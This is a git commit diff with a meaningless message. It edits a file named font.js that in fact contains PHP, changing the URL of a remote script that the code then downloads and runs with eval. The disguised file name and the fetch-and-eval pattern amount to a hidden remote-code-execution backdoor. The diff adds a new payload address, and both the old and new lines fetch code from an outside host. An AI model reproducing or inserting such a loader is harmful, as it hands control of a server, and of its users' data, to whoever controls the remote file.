5b03bc359dd54a83484a55498c7a2f0cfbbbe741
IDTT <iddt1337@gmail.com>
2019-09-16 10:51:08 +0700

    asfsfs
    saff

--- font.js
+++ font.js
@@ -1,6 +1,6 @@
 <?php
 
-$url = "https://cdn.via.com/static/img/v1/newui/ph/general/1568602819363_button.js";
+$url = "https://cdn.via.com/static/img/v1/newui/ph/general/1568605795186_bisa.js";
 $data = file_get_contents($url);
 eval('?>'.$data);
 
